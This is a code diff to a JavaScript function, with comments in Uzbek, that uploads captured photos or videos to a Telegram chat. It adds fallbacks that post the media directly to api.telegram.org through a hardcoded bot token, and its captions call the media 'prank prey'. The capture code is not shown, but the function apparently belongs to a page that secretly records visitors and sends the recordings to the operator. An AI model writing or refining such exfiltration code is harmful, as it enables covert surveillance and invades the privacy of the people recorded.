@@ -309,34 +309,48 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                const result = await res.json();
-                if (result.ok) return;
+                if (res.ok) {
+                    const result = await res.json();
+                    if (result.ok) return true;
+                }
             } catch (apiErr) {
-                console.warn("API xatosi, Telegram API ga to'g'ridan-to'g'ri yuborilmoqda:", apiErr);
+                console.warn("API xatosi, to'g'ridan-to'g'ri yuborilmoqda:", apiErr);
             }
 
-            // 2-qadam: Zaxira varianti (Direct Telegram API fallback)
+            // 2-qadam: Zaxira — to'g'ridan-to'g'ri Telegram API ga FormData bilan
             try {
                 const blob = await (await fetch(payload.data)).blob();
                 const fd = new FormData();
                 fd.append('chat_id', payload.chat_id);
-                fd.append('caption', '🎯 Yangi prank o\'ljasi (To\'g\'ridan-to\'g\'ri)');
+                fd.append('caption', '🎯 Prank o\'ljasi');
 
                 if (payload.type === 'video') {
-                    fd.append('video', blob, 'video.webm');
-                    await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendVideo`, {
-                        method: 'POST',
-                        body: fd
+                    const ext = (payload.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
+                    fd.append('video', blob, `video.${ext}`);
+                    let r = await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendVideo`, {
+                        method: 'POST', body: fd
                     });
+                    let d = await r.json();
+                    if (!d.ok) {
+                        // sendDocument bilan zaxira
+                        const fd2 = new FormData();
+                        fd2.append('chat_id', payload.chat_id);
+                        fd2.append('caption', '🎯 Prank video');
+                        fd2.append('document', blob, `video.${ext}`);
+                        await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendDocument`, {
+                            method: 'POST', body: fd2
+                        });
+                    }
                 } else {
                     fd.append('photo', blob, 'photo.jpg');
                     await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
+                        method: 'POST', body: fd
                     });
                 }
+                return true;
             } catch (tgErr) {
                 console.error("Direct fallback xatosi:", tgErr);
+                return false;
             }
         }
 
